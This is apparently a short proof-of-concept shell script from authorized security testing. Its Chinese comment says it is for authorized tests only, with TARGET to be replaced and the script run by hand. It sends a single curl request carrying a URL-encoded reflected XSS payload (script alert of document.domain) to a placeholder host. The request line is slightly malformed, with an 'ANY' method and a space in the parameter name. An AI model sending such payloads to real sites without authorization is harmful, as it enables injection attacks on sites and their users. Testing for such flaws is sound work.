#!/usr/bin/env sh
set -eu
# 仅限授权测试；替换 TARGET 后手动执行
curl -sS -i -X ANY 'http://TARGET:8080/053?request parameter=%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E'
